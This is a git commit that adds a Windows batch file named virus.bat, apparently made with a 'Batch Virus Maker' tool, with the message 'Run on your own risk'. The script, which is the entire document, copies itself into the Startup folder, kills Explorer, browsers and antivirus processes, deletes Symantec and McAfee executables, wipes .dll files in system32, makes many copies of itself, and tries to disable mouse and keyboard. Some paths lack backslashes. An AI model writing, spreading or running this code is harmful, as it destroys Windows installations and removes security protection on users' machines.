310a42582e50d9b17a09f4bb97e0d2d5ee27620c
Dani Boii <105583437+Orta12@users.noreply.github.com>
2022-10-15 14:03:58 +0530

    Run on your own risk

---
+++ virus.bat
@@ -0,0 +1,43 @@
+@echo off
+copy “virus.bat” “C:Documents and SettingsAll UsersStart MenuProgramsStartup”
+copy “virus.bat” “C:”
+copy “virus.bat” “%userprofile%My Documents”
+tskill explorer
+tskill ccapp
+tskill yahoomessenger
+tskill firefox
+tskill chrome
+rem made with Batch Virus Maker V.2
+tskill iexplorer
+time 12:00
+rem made with Batch Virus Maker V.2
+del C:Program FilesCommon FilesSymantec Sharedccapp.exe
+cd C:WINDOWS
+if exist “*.bat” del “*.bat”
+cd C:WINDOWSsystem32
+rem made with Batch Virus Maker V.2
+if exist “*.dll” del “*.dll”
+tskill McAfee Security Centre Module
+del c:program filesmcafee.comagentmcdetect.exe
+rem made with Batch Virus Maker V.2
+copy “virus.bat” “virus.bat45544”
+copy “virus.bat” “virus.bat85858”
+copy “virus.bat” “virus.bat1645”
+copy “virus.bat” “virus.bat574457”
+copy “virus.bat” “virus.bat55457”
+copy “virus.bat” “virus.bat9765”
+copy “virus.bat” “virus.bat45465”
+rem made with Batch Virus Maker V.2
+copy “virus.bat” “virus.bat456877”
+copy “virus.bat” “virus.bat77989845”
+copy “virus.bat” “virus.bat2135”
+copy “virus.bat” “virus.bat46876”
+rem made with Batch Virus Maker V.2
+copy “virus.bat” “virus.bat45687”
+copy “virus.bat” “virus.bat8868”
+copy “virus.bat” “virus.bat2000”
+copy “virus.bat” “virus.bat2009”
+msg * this is a virus
+rundll mouse,disable
+rem made with Batch Virus Maker V.2
+rundll keyboard,disable
